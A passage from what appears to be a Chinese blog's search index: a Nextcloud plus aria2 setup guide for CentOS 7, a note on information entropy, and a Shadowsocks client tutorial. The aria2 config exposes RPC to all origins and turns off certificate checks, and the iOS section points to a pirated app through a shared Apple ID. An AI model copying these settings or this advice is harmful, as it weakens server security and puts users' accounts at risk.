yum-utils配置 PHP 软件库版本，安装 PHPsudo yum-config-manager --enable remi-php72  sudo yum install php 截至发稿，可用的最新版本为 7.2，你可以修改为 7.x 以获取其他 PHP 版本，但注意命令执行会有成功提示，否则还是安装默认的低版本 PHP。查看当前 PHP 版本:php -v安装额外的 PHP 模块sudo yum install php-mysql php-pecl-zip php-xml php-mbstring php-gd配置 PHP 上传大小限额首先获取 PHP 配置加载路径：php --ini |grep LoadedLoaded Configuration File: /etc/php.ini修改 post_max_size、upload_max_filesizesudo vim /etc/php.inipost_max_size = 100Mupload_max_filesize = 100M重启Apache、PHPsudo systemctl restart httpdsudo systemctl restart php7.2-fpm.serviceStep 2 - 安装并配置数据库MariaDB 是社区开发的 MySql 分支，CentOS 7 默认数据软件为 MariaDB。Nextcloud 运行需要一个数据库。安装 MariaDBsudo yum -y install mariadb mariadb-server开机启动 MariaDBsudo systemctl start mariadb sudo systemctl enable mariadb执行 mysql_secure_installation 配置数据库 root 密码及安全选项。如果只是搭建 Nextcloud，后面几个都选择 Y 即可sudo mysql_secure_installationEnter current password for root (enter for none): ENTERSet root password? [Y/n] YRemove anonymous users? [Y/n] YDisallow root login remotely? [Y/n] YRemove test database and access to it? [Y/n] YReload privilege tables now? [Y/n] Y为 Nextcloud 创建一个数据库mysql -u root -pMariaDB [(none)]&amp;gt; CREATE DATABASE nextcloud;MariaDB [(none)]&amp;gt; GRANT ALL PRIVILEGES ON nextcloud.* TO &#39;nextclouduser&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;YOURPASSWORD&#39;;&#39;nextclouduser&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;你的数据库密码&#39;;MariaDB [(none)]&amp;gt; FLUSH PRIVILEGES;MariaDB [(none)]&amp;gt; qStep 3 -安装 Nextcloud 13前往  Nextcloud 官网下载最新发布的版本cd /tmpwget https://download.nextcloud.com/server/releases/nextcloud-xx.x.x.zipsudo mkdir /var/www/yourdomain.com/sudo unzip nextcloud-xx.x.x.zip -d /var/www/yourdomain.com/sudo cd /var/www/yourdomain/nextcloudsudo chown -R apache:apache config data apps出于安全考虑，你可以只将 Nextcloud 运行必须的三个文件夹属主修改为 apache，后续更新版本再临时修改 nextcloud/ 的属主为 apacheStep 4 - 配置 Apache让 CentOS 7 Apache2 支持 sites-enabled 目录结构（这样能够使以后站点配置更加灵活直观）。编辑 http.conf，尾部增加一行sudo vim /etc/httpd/conf/httpd.confIncludeOptional sites-enabled/*.conf为你的域名添加为一个 Virtual Host 文件，指向 nextcloud 目录sudo vim /etc/httpd/sites-enabled/yourdomain.com.conf&amp;lt;VirtualHost *:80&amp;gt;        ServerName yourdomain.com        DocumentRoot /var/www/yourdomain.com/nextcloud        ErrorLog /var/www/yourdomain.com/error.log        CustomLog /var/www/yourdomain.com/requests.log combined&amp;lt;/VirtualHost&amp;gt;&amp;lt;Directory /var/www/yourdomain.com/nextcloud&amp;gt;        AllowOverride All        Require all granted&amp;lt;/Directory&amp;gt;提示：支持  sites-enabled 、sites-available 目录结构可以让你更方便地配置和管理Virtual Host，你应该将不同 Virtual Host 配置文件统统存储在 site-available 目录下，而在 sites-enabled 目录下配置软链接来映射你想启用的 Virtual Host。Debian 发行版已经支持。Sep 5 - 完成 Nextcloud 安装访问 yourdomain.com，进行最后的 Nextcloud 安装。安装过程中填入前面配置的数据库名、数据用户、数据库密码并创建你的Nexcloud管理员账号。至此，Nextcloud 安装完成。Database user: nextclouduserDatabase password: 你的数据库密码Database name: nextcloudhost: localhostStep 6 - 安装并配置 aria2安装 aria2。aria2 在各大 Linux 发行版中已可直接安装## CentOS 7:sudo yum install aria2## Ubuntu:sudo apt install aria2也采用编译安装的方式，安装最新版本//TODO: 补充编译安装配置运行 aria2 守护进程。创建 aria2 配置文件，注意指定你自己的 rpc-secretsudo vim /etc/aria2.conf## Basic Optionsdir=/home/apache/downloadsinput-file=/var/aria2/aria2.sessionlog=/var/aria2/aria2.logmax-concurrent-downloads=3max-connection-per-server=8check-integrity=truecontinue=true## BitTorrent/Metalink Optionsbt-enable-lpd=truebt-max-open-files=16bt-max-peers=8dht-file-path=/var/aria2/dht.datdht-listen-port=6801#enable-dht6=truelisten-port=6801max-overall-upload-limit=0Kseed-ratio=1.0## RPC Optionsenable-rpc=truerpc-allow-origin-all=truerpc-listen-all=truerpc-listen-port=6800rpc-secret=&amp;lt;你的口令&amp;gt;#rpc-secure=true#save-session-interval=2#force-save=truecheck-certificate=falserpc-save-upload-metadata=true## Advanced Optionsdaemon=true#enable-mmap=truelog-level=warnfile-allocation=nonemax-overall-download-limit=0Ksave-session=/var/aria2/aria2.sessionalways-resume=truesplit=4min-split-size=10M## Pan.baidu.com user agent#user-agent=netdisk;7.8.1;Red;android-android;4.3创建 aria2 运行所需的文件sudo mkdir /var/aria2sudo cd /var/aria2sudo touch aria2.session dht.dat aria2.logsudo chown apache:apache aria2.session dht.dat aria2.log创建 aria2下载目录。这个目录要可以被 Nextcloud 访问，因此该目录属主必须是 apache（其他 Linux 发行版也可能是 www-data）sudo mkdir -p /home/apache/downloadssudo chown apache:apache -R /home/apache/downloads创建 aria2 的 systemd 服务文件。记住你需要以 apache 用户运行 aria2sudo vim /etc/systemd/system/aria2.service [Unit]Description=Aria2c download managerRequires=network.targetAfter=network.target[Service]Type=forkingUser=apacheRemainAfterExit=yesExecStart=/usr/bin/aria2c --conf-path=/etc/aria2.confExecReload=/usr/bin/kill -HUP $MAINPIDRestartSec=1minRestart=on-failure[Install]WantedBy=multi-user.target 启动 aria2 并使其开机启动sudo systemctl restart aria2.servicesudo systemctl enable aria2.service使用 AriaNg 远程连接 aria2。AriaNg 是 aira2 的一款前端软件，用来控制 aria2 执行下载任务。安装过程十分简单：前往 GitHub 下载最新版本的 AriaNg，解压至 /var/www/yourdomain.com/nextcloud 即可。cd /tmpwget https://github.com/mayswind/AriaNg/releases/download/0.4.0/aria-ng-0.4.0.zipunzip aria-ng-0.4.0.zip -d /var/www/yourdomain.com/nextcloud/ariang访问 yourdomain.com/ariang，使用先前配置的 rpc-secret 连接。到这里，你已完成服务器端的全部完成。Step 7 - 让你的 Nextcloud 集成 aria2现在，你的 aria2 能够正常运行了，下载好的文件也将保存到 /home/apache/downloads 目录。最后一步，前往 Nextcloud 管理员界面，将 /home/apache/downloads 目录添加至 Nextcloud 外部存储，congratulation！" }, { "title": "“信息量” 到底有多大？", "url": "/posts/quantities-of-information/", "categories": "Misc", "tags": "信息论", "date": "2018-04-19 00:00:00 +0800", "snippet": "前言生活中，我们常说 “啊，这个信息量很大呀！”。但所谓信息量大，到底有多大？可以量化吗？根据香农的理论，答案是肯定的。信息量的度量信息量实际上是事件不确定度的度量，越不确定的事件，对其的描述就包含越多信息。 举例来说，“明天太阳东边升起”，这句话是没有任何信息量的，因为我们都知道太阳总是东升西落。香农为我们总结了信息量的计算方法：一条消息的信息量等于log(1/P)，其中底数大于1，通常为2，P为消息描述的事情发生的概率。根据这个公式，P越小信息量越大、P越大信息量越小。举例来说：“这次他买彩票中了头奖”，这个信息量非常大；“这次他买彩票没中奖”，这个信息量就很小。当然，事情并非绝对。“太阳东升西落”作为一条自然知识，在一些情况下还是具有信息量的：假设一个人完全不知道太阳从哪边升起，即可能1/2为东升西落，1/2为西升东落，此时“太阳东边升起西边落下”这个描述对他而言还是有信息量的：信息量按2为底为log2=1bit。（显然，等他明白后，再告诉他太阳从哪边升起来，就又变得没信息量了:D）。从中彩这个例子看，描述同一件事情的消息，其信息量既可能很大，也可能很小。我们要筛选更有价值的消息，就有必要知道消息的平均信息量，即信息量期望。因此我们引入信息熵。信息熵描述消息的平均信息量，即信息量的期望，计算公式如下图图：还是举例来说：我在老家钓鱼。 “这次钓上来的是xx”，这句话的期望信息量对我而言其实不高，因为我早已知道老家鱼塘里钓到罗非鱼的概率比其他鱼、螃蟹的概率要大得多。假设钓到罗非鱼的概率为1/2，钓到其他鱼的概率为1/4，钓到虾的概率为1/8，钓到青蟹的概率为1/8。那么“这次钓上来的是x”的信息熵为1/2*1+1/4*2+1/8*3+1/8*3=7/4bit" }, { "title": "Shadowsocks 客户端使用教程", "url": "/posts/how-to-use-shadowsocks-client/", "categories": "Tutorial, Shadowsocks", "tags": "Shadowsocks", "date": "2015-04-05 00:00:00 +0800", "snippet": "简介想用 Google 搜资料却碰到404错误？想用 Facebook 交流却连账号都注册不了？没问题，本文首先简要介绍了 Shadowsocks 的工作原理，然后详细说明了各个平台下使用 Shadowsocks 客户端的方法，按照本文的方法你就可以正常访问 Google 了。Shadowsocks 工作原理如图所示，由于防火墙（GFW）作为出口网关级的存在，中国境内发起的所有境外访问均会可被随意阻断，通常这种阻断组合利用了 IP 地址拦截、 DNS 污染、流量识别等多项技术。但目前为止，防火墙的封禁还是基于黑名单机制，未在黑名单的境外服务器依然能够正常访问。基于此，借助 Shadowsocks 客户端和位于境外的 Shadowsocks 代理服务器就能够间接地绕过防火墙，同时客户端与代理服务器间的通信数据采取了加密保护，使得防火墙无法正常识别流量。各平台客户端使用教程Android 安装 Android 客户端 配置好服务器端信息（可以通过剪贴板导入、扫描二维码、手动配置等方式） 打开客户端，点击启动按钮，不出意外，你已经可以访问 Google 了。 提示：在客户端路由选项里选择绕过局域网及中国大陆地址可优化外网冲浪体验；如果你添加了多个服务器，可以通过影梭的菜单栏来切换选择；你还可以通过分应用代理进一步优化上网体验。iOS推荐使用 Shadowrocket由于 Apple Store 国区已全部下架翻墙 App，只好使用企业账户应用分发渠道下载盗版 Shadowrocket，具体方法如下： 进入 https://ios.ss-ssr.com，按页面提示安装好 Shadowrocket 打开 Shadowrocket，在弹出登录框中用网站提供的 Apple ID 登录 Apple Store（该帐号已购买应用）以激活应用。 注意：激活成功后你可在 Apple Store 中注销这个 Apple ID，用自己的 Apple ID 恢复登录; 不要使用三方 Apple ID 登录你的 iCloud，否则存在隐私和安全风险！Windows 下载 Windows 版 Windows 版客户端 解压缩包至你喜欢的目录 启动 Shadowsocks 双击击运行 shadowsocks.exe ，配置好你的远程服务器，选择 PAC模式。不出意外，此时你的 IE 浏览器已经可以正常访问 Google 了。如果你日常使用 Chrome ，请参考下文 Linux 客户端的配置方法，安装 SwitchyOmega 扩展来优化网上冲浪体验。Mac OS以后再写吧…Linux 安装 Shadowsocks 客户端（Python 版）## Debian/Ubuntusudo apt-get install python-pipsudo pip install shadowsocks## CentOSsudo yum install python-setuptoolssudo easy_install pipsudo pip install shadowsocks你也可以到 这里 选择你喜欢的 Shadowsocks 版本 配置 Shadowsocks 客户端和 Chrome创建一个配置文件 shadowsocks.json，内容如下：{ &quot;server&quot;:&quot;服务器地址&quot;, &quot;server_port&quot;:服务端端口号, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;密码&quot;, &quot;method&quot;:&quot;加密方式&quot;}给你的 Chrome 安装 SwitchyOmega，并根据需要配置代理。 通过 Shadowsocks 代理上网启动 Shadowsockssslocal -c /..你的路径../shadowsocks.jsonSwitchyOmega 选择 自动切换（仅国外代理）或者 Shadowsocks （完全代理）如图所示不出意外，你已经可以访问 Google 了 :)OpenWrt 客户端参考博主新近写的 OpenWrt Shadowsocks 安装&amp;amp;配置指南" } ]
